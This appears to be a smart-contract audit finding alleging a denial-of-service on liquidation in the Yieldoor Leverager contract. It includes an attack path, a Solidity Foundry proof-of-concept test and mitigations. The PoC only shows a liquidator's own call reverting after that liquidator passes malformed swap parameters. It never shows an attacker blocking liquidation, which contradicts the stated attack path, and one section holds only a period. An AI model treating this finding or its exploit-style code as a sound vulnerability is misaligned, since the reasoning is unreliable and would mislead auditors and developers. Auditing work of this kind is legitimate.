# Liquidation Process Vulnerable to Deliberate Swap Failures and Protocol Manipulation

### Summary

The [`liquidatePosition`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Leverager.sol#L299) function in the Leverager contract is susceptible to a sophisticated denial of service attack where an attacker can deliberately cause swap failures during liquidation, potentially preventing the protocol from managing risky positions.

### Root Cause

In `Leverager.sol`, the `liquidatePosition` function allows liquidators to specify complex swap parameters without robust failure prevention mechanisms.

### Internal Pre-conditions

1. Position must be in a liquidatable state
2. Liquidator must have sufficient funds
3. Swap paths must be configurable


### External Pre-conditions

.

### Attack Path

1. Attacker opens a leveraged position
2. Position becomes liquidatable
3. Attacker crafts malicious swap parameters
4. Liquidation attempt is blocked or fails
5. Protocol unable to manage underwater position

### Impact

- Prevents timely liquidation of risky positions
- Potential accumulation of bad debt
- Undermines protocol's risk management mechanisms

### PoC


```solidity
function test_liquidationDoS() public {
    vm.startPrank(depositor);
    ILeverager.LeverageParams memory lp;
    lp.amount0In = 0.5e8;
    lp.amount1In = 50_000e6;
    lp.vault0In = 1e8;
    lp.vault1In = 100_000e6;
    lp.vault = vault;
    lp.maxBorrowAmount = 200e18;
    lp.denomination = address(weth);

    bytes memory _path1 = abi.encodePacked(address(wbtc), uint24(3000), address(weth));
    bytes memory _path2 = abi.encodePacked(address(usdc), uint24(3000), address(weth));

    IMainnetRouter.ExactOutputParams memory ep1;
    ep1.path = _path1;
    ep1.deadline = block.timestamp;
    ep1.amountInMaximum = type(uint256).max;
    ep1.recipient = leverager;

    IMainnetRouter.ExactOutputParams memory ep2;
    ep2.path = _path2;
    ep2.deadline = block.timestamp;
    ep2.amountInMaximum = type(uint256).max;
    ep2.recipient = leverager;

    lp.swapParams1 = abi.encode(ep1);
    lp.swapParams2 = abi.encode(ep2);

    deal(address(wbtc), depositor, 0.5e8);
    deal(address(usdc), depositor, 50_000e6);
    wbtc.approve(leverager, type(uint256).max);
    usdc.approve(leverager, type(uint256).max);

    uint256 posId = ILeverager(leverager).openLeveragedPosition(lp);

    MockOracle(wethOracle).setPrice(6000e18);

    vm.startPrank(liquidator);

    ILeverager.LiquidateParams memory liqParams;
    liqParams.id = posId;
    liqParams.hasToSwap = true;

    IMainnetRouter.ExactInputParams memory swapParams1;
    swapParams1.amountIn = type(uint256).max;
    swapParams1.deadline = block.timestamp;
    swapParams1.path = abi.encodePacked(address(wbtc), uint24(3000), address(usdc));
    swapParams1.recipient = address(0);

    IMainnetRouter.ExactInputParams memory swapParams2;
    swapParams2.amountIn = type(uint256).max;
    swapParams2.deadline = block.timestamp;
    swapParams2.path = abi.encodePacked(address(usdc), uint24(3000), address(weth));
    swapParams2.recipient = address(0);

    liqParams.swapParams1 = abi.encode(swapParams1);
    liqParams.swapParams2 = abi.encode(swapParams2);

    deal(address(weth), liquidator, 300e18);
    weth.approve(leverager, type(uint256).max);

    vm.expectRevert();
    ILeverager(leverager).liquidatePosition(liqParams);
}
```

### Mitigation

1. Implement fallback liquidation mechanisms
2. Add time-based constraints on liquidation attempts
3. Add maximum slippage and deadline checks
